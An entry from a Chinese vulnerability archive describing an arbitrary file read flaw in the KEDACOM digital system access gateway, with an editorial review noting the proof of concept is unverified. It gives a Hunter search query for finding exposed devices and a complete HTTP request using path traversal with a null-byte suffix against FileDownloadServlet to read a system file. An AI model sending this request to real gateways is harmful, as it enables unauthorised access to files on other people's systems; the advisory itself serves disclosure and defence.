---
source: "wy876 漏洞文库"
id: "vw-7515374ccdf473eb7628e10b"
entity_id: "ve-7515374ccdf473eb7628e10b"
schema_version: "1"
title: "KEDACOM数字系统接入网关 任意文件读取漏洞"
product: "KEDACOM数字系统接入网关"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Windows，带两个同名JSESSIONID；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/KEDACOM%E7%A7%91%E8%BE%BE/KEDACOM%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/agh61crlxr5redq2"
source_status: "recorded"
previous_fofa_unverified: "web.body="
hunter: "web.body=\"/**起始端口变量*/\""
---

# KEDACOM数字系统接入网关 任意文件读取漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：KEDACOM数字系统接入网关
- 本文讨论：FileDownloadServlet filePath路径穿越/空字节后缀
- 版本、权限与配置前提：Windows，带两个同名JSESSIONID；版本未知
- 资料类型：Java文件读取PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 两个不同JSESSIONID混用导致会话歧义，认证前提未说明
- %00.jpg截断依赖具体运行时/解码版本，未解释；无输出/修复
- fofa误录Hunter残缺字段
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- NUL支持、鉴权及版本范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件

# 二、影响版本
+ KEDACOM 数字系统接入网关

# 三、资产测绘
+ hunter`web.body="/**起始端口变量*/"`
+ 特征


# 四、漏洞复现
```http
GET /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=FAEECB621961790CDFC5AB87BBEB1E20; JSESSIONID=760C78AEAACEFF5C9110E58901A9AAC3
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/agh61crlxr5redq2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
